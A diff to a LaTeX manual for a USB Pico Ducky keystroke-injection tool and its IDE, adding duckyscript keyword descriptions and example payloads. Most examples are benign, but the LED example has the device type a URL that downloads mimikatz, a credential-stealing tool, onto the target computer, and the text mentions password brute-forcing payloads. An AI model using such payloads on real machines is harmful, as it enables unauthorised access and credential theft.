@@ -9,11 +9,13 @@
 \usepackage{booktabs}
 
 \definecolor{bgColor}{rgb}{0.95,0.95,0.92}
+\definecolor{cgreen}{RGB}{8, 110, 16}
 
 \lstdefinestyle{DuckyCode}{
     backgroundcolor=\color{bgColor},
-    commentstyle=\color{green},
-    keywordstyle=\color{blue},
+    commentstyle=\color{cgreen},
+	keywordstyle=[1]\color{blue},
+	keywordstyle=[2]\color{red},
     numberstyle=\tiny\color{magenta},
     stringstyle=\color{purple},
     basicstyle=\ttfamily\footnotesize,
@@ -35,8 +37,8 @@
 }
 
 \lstdefinelanguage{Ducky}{
-	keywords={STRING, DELAY, IMPORT, LED, REPEAT, PRINT, DEFAULT\_DELAY, DEFAULTDELAY}
-	otherkeywords={!,!=,~,$,*,\&,\%/\%,\%*\%,\%\%,<-,<<-,\_,/},
+	keywords={STRING, DELAY, IMPORT, LED, REPEAT, PRINT, DEFAULT\_DELAY, DEFAULTDELAY, WINDOWS, GUI},
+	keywords=[2]{CTRL, SHIFT, ALT, ENTER},
 	comment=[l]{REM},
 }
 
@@ -154,7 +156,7 @@ it's that only Duckyscript 1.0 is supported on a USB Pico Ducky while USB Rubber
 
 \textbf{Payloads} are a file written in duckyscript. Payloads basically have instructions given to the USB so that the USB knows what keystrokes to input.
 
-A hacking USB only supports one mode at a time, it can either execute a payload when connected to a device, or it can be in setup mode where you upload the payload (more details can be found in section \ref{upload_payloads}), 
+A USB Rubber Ducky only supports one mode at a time while the USB Pico Ducky supports as many as you wish, you can use the $IMPORT$ keyword as specified in section \ref{ducky_import}, note that this only executes a different payload in the current payload. it can either execute a payload when connected to a device, or it can be in setup mode where you upload the payload(s) (more details can be found in section \ref{upload_payloads}), 
 
 \subsection{Saving \& Editing}\label{save_edit}
 
@@ -264,13 +266,13 @@ First, write the duckyscript program, then save it as specified in section \ref{
 
 To upload payloads onto the USB Pico Ducky, click the upload button \includegraphics[width=5.5mm]{pictures/white_bk/upload.png}, which is right beside the Operating System Selector popup on the toolbar.
 
-You can upload up to 2 files at a time. But only run one at a time.
+You can upload as many files (.dd) as you want. But only run one at a time.
 
-In duckyscript, it is not possible to write a program that uses multiple files and this is also not necesarry. You can add up to 2 payloads (e.g. payload.dd, payload1.dd) at a time. You can switch between the payloads using the white switch on the USB Pico Ducky
+In duckyscript, it is normally not possible to write a program that uses multiple files at a time, except it is possible in a USB Pico Ducky. You can also switch between the payloads using the white switch on the USB Pico Ducky.
 
 This is useful for when you need different payloads for different OSs. For example, you might want to have a Mac version and a Windows version of a password brute-forcing payload. This is useful for when you aren't sure about the OS of the target computer. \textbf{Not even USB Rubber Ducky comes with this feature}
 
-\textbf{The valid payload names are: payload.dd, payload1.dd}
+\textbf{The valid payload names are: payload.dd, payload1.dd\dots}
 
 \subsection{Execute}
 
@@ -314,6 +316,9 @@ REM & DELAY & STRING & PRINT & DEFAULT\_DELAY
 \end{bmatrix}\\\\$
 \normalsize
 
+Some of these keywords refer to the same thing, this website shows which keywords share the same meanings
+https://wiki.spacehuhn.com/wifiduck/usage/duckyscript/
+
 \subsection{Tutorial}
 
 As you can see on section \ref{all_keywords}, all these keywords have to be capital. If you type it correctly, the keyword will change color on the IDE (only if it's used at the beginning of a line), this way you can now that you typed it correctly.
@@ -322,13 +327,13 @@ as you can see most of these keywords can be found on the keyboard. This is beca
 
 Here are the duckyscript commands that aren't keyboard keys:
 \\1. \textbf{REM}: stands for 'REMOVE', it's used for commenting code, here is an example:
-\\2. \textbf{DELAY}: 
-\\3. \textbf{STRING}: 
-\\4. \textbf{REPEAT}: 
-\\5. \textbf{PRINT}: 
-\\6. \textbf{IMPORT}: 
-\\7. \textbf{DEFAULTDELAY \& DEFAULT\_DELAY}: 
-\\8. \textbf{LED}: 
+\\2. \textbf{DELAY}: a pause (in milliseconds). Used for when waiting for an interface to catch up with the USB Pico Ducky typing speed
+\\3. \textbf{STRING}: types whatever comes after the command
+\\4. \textbf{REPEAT}: repeats the previous command N times
+\\5. \textbf{PRINT}: prints whatever comes after to python console
+\\6. \textbf{IMPORT}: imports and executes another duckyscript file to execute (has to be in the same path/folder), this functionality doesn't exist in the USB Rubber Ducky but does exist in this USB Pico Ducky.
+\\7. \textbf{DEFAULTDELAY \& DEFAULT\_DELAY}:  DEFAULTDELAY specifies how long (in milliseconds) to wait between each line of command. If not specified, DEFAULTDELAY is 18ms.
+\\8. \textbf{LED}: change the state of the LED (on/off)
 
 Keyboard keys are used for typing, and shortcuts.
 
@@ -337,6 +342,7 @@ Payload examples can be found in section \ref{duckyscript_examples}.
 \subsection{Examples}\label{duckyscript_examples}
 
 \subsubsection{Comment}
+
 \begin{figure}[htb]
 \begin{small}
 \begin{lstlisting}[language=Ducky]
@@ -348,17 +354,141 @@ REM this is a comment
 
 \subsubsection{Delay}
 
+\begin{figure}[htb]
+\begin{small}
+\begin{lstlisting}[language=Ducky]
+REM delay by 500 miliseconds before locking windows pc (opens lockscreen)
+DELAY 500
+WINDOWS L
+REM in the code above, windows takes the L (like always, nearly all viruses and attacks target windows)
+\end{lstlisting}
+\end{small}
+\caption{Delay Example}
+\end{figure}
+
 \subsubsection{STRING}
+
+\begin{figure}[htb]
+\begin{small}
+\begin{lstlisting}[language=Ducky]
+REM delay by 100 miliseconds before starting a windows powershell
+DELAY 100
+GUI R
+STRING powershell
+DELAY 100
+ENTER
+\end{lstlisting}
+\end{small}
+\caption{STRING Example}
+\end{figure}
 
 \subsubsection{REPEAT}
 
+\begin{figure}[htb]
+\begin{small}
+\begin{lstlisting}[language=Ducky]
+REM delay by 100 miliseconds before starting 10 new google tabs
+DELAY 100
+WINDOWS S
+STRING google
+ENTER
+CTRL T
+REPEAT 10
+\end{lstlisting}
+\end{small}
+\caption{REPEAT Example}
+\end{figure}
+
 \subsubsection{PRINT}
 
-\subsubsection{IMPORT}
+\begin{figure}[htb]
+\begin{small}
+\begin{lstlisting}[language=Ducky]
+REM delays by 300 miliseconds, and opens 10 google tabs, then prints successfully opened 10 tabs
+DELAY 300
+WINDOWS S
+STRING chrome
+ENTER
+CTRL T
+REPEAT 10
+PRINT Successfully opened 10 tabs
+\end{lstlisting}
+\end{small}
+\caption{PRINT Example}
+\end{figure}
+
+\subsubsection{IMPORT}\label{ducky_import}
+For example, there are 2 files, payload.dd and payload2.dd (there can be as many as you wish)
+\begin{figure}[htb]
+\begin{small}
+\begin{lstlisting}[language=Ducky]
+REM delay by 300ms, then paste the last copied thing onto a notepad
+DELAY 300
+WINDOWS R
+STRING notepad.exe
+ENTER
+CTRL V
+PRINT Successfully printed the last thing that was copied onto a notepad
+\end{lstlisting}
+\end{small}
+\caption{payload.dd}
+\end{figure}
+
+\begin{figure}[htb]
+\begin{small}
+\begin{lstlisting}[language=Ducky]
+REM wait 500ms, import payload.dd (import keyword executes the file specified)
+DELAY 500
+IMPORT payload.dd
+
+REM save file and close all notepad files
+DELAY 100
+CTRL S
+CTRL SHIFT W
+\end{lstlisting}
+\end{small}
+\caption{payload2.dd}
+\end{figure}
+
 
 \subsubsection{DEFAULTDELAY \& DEFAULT\_DELAY}
 
+\begin{figure}[htb]
+\begin{small}
+\begin{lstlisting}[language=Ducky]
+REM set default delay to 250, this will cause all commands being executed once every 250ms
+DEFAULTDELAY 100
+WINDOWS R
+STRING notepad.exe
+ENTER
+STRING Every command is being executed after a delay of 250ms
+\end{lstlisting}
+\end{small}
+\caption{DEFAULTDELAY Example}
+\end{figure}
+
 \subsubsection{LED}
+
+\begin{figure}[htb]
+\begin{small}
+\begin{lstlisting}[language=Ducky]
+REM wait 500ms, then update LED status once successfully installed mimikatz virus from the web
+DELAY 500
+WINDOWS S
+STRING chrome
+ENTER
+STRING https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+ENTER
+DELAY 300
+
+REM once the virus downloads, turn on the LED of USB Pico Ducky
+LED
+\end{lstlisting}
+\end{small}
+\caption{LED Example}
+\end{figure}
+
+\newpage
 
 \section{Setup}
 
